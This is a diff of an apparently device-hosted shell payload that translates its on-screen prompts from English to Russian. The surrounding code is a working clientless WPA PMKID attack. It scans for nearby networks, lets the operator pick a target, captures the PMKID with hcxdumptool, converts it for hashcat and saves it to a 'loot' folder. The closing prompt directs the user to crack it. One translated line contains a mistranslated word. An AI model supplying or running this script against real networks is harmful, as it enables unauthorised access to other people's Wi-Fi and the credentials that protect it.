@@ -8,14 +8,13 @@
 LOOT_DIR="/mmc/nullsec/captures"
 mkdir -p "$LOOT_DIR"
 
-PROMPT "PMKID GRABBER
+PROMPT "ПЕРЕХВАТЧИК PMKID
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-Clientless WPA attack.
-Captures PMKID from AP
-without waiting for
-handshake.
+Бесшумная WPA-атака.
+Переделяет PMKID от точки
+без ожидания рукопожатия.
 
-Press OK to scan."
+Нажмите OK для сканирования."
 
 MONITOR_IF=""
 for iface in wlan1mon wlan2mon mon0; do
@@ -25,11 +24,11 @@ done
 
 # Check for hcxdumptool
 if ! which hcxdumptool >/dev/null 2>&1; then
-    ERROR_DIALOG "hcxdumptool не найден!\nInstall: opkg install hcxdumptool"
+    ERROR_DIALOG "hcxdumptool не найден!\nУстановите: opkg install hcxdumptool"
     exit 1
 fi
 
-SPINNER_START "Scanning targets..."
+SPINNER_START "Сканирование целей..."
 rm -f /tmp/pmkid_scan*
 timeout 15 airodump-ng "$MONITOR_IF" -w /tmp/pmkid_scan --output-format csv 2>/dev/null &
 sleep 15
@@ -52,15 +51,15 @@ while IFS=',' read -r bssid x1 x2 channel x3 cipher auth power x4 x5 x6 x7 essid
     [ $idx -ge 8 ] && break
 done < /tmp/pmkid_scan-01.csv
 
-[ $idx -eq 0 ] && ERROR_DIALOG "No WPA targets found!" && exit 1
+[ $idx -eq 0 ] && ERROR_DIALOG "WPA-цели не найдены!" && exit 1
 
-PROMPT "WPA Targets: $idx
+PROMPT "WPA-цели: $idx
 
 $(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${NAMES[$i]}"; done)
 
-Select target number."
+Выберите номер цели."
 
-SEL=$(NUMBER_PICKER "Target (1-$idx):" 1)
+SEL=$(NUMBER_PICKER "Цель (1-$idx):" 1)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
 SEL=$((SEL - 1))
 [ $SEL -lt 0 ] && SEL=0
@@ -71,10 +70,10 @@ TARGET_CH="${CHANS[$SEL]}"
 TARGET_NAME="${NAMES[$SEL]}"
 OUTFILE="$LOOT_DIR/pmkid_${TARGET_NAME}_$(date +%Y%m%d_%H%M%S)"
 
-resp=$(CONFIRMATION_DIALOG "PMKID attack on:\n${TARGET_NAME}\n\nThis may take 1-2 min.\nProceed?")
+resp=$(CONFIRMATION_DIALOG "Атака PMKID на:\n${TARGET_NAME}\n\nМожет занять 1-2 минуты.\nПродолжить?")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
-SPINNER_START "Capturing PMKID..."
+SPINNER_START "Перехват PMKID..."
 iwconfig "$MONITOR_IF" channel "$TARGET_CH" 2>/dev/null
 timeout 120 hcxdumptool -i "$MONITOR_IF" --filterlist_ap="$TARGET_BSSID" --filtermode=2 -o "${OUTFILE}.pcapng" 2>/dev/null
 SPINNER_STOP
@@ -82,18 +81,18 @@ SPINNER_STOP
 if [ -f "${OUTFILE}.pcapng" ] && [ -s "${OUTFILE}.pcapng" ]; then
     hcxpcapngtool "${OUTFILE}.pcapng" -o "${OUTFILE}.22000" 2>/dev/null
     PMKID_COUNT=$(wc -l < "${OUTFILE}.22000" 2>/dev/null || echo "0")
-    PROMPT "PMKID CAPTURED!
+    PROMPT "PMKID ПЕРЕХВАЧЕН!
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-Target: $TARGET_NAME
-PMKIDs: $PMKID_COUNT
-File: $(basename ${OUTFILE})
+Цель: $TARGET_NAME
+PMKID: $PMKID_COUNT
+Файл: $(basename ${OUTFILE})
 
-Crack with hashcat:
+Взлом через hashcat:
 hashcat -m 22000"
 else
-    PROMPT "NO PMKID CAPTURED
+    PROMPT "PMKID НЕ ПЕРЕХВАЧЕН
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-Target may not support
-PMKID. Try handshake
-capture instead."
+Цель может не поддерживать
+PMKID. Используйте захват
+рукопожатия вместо этого."
 fi
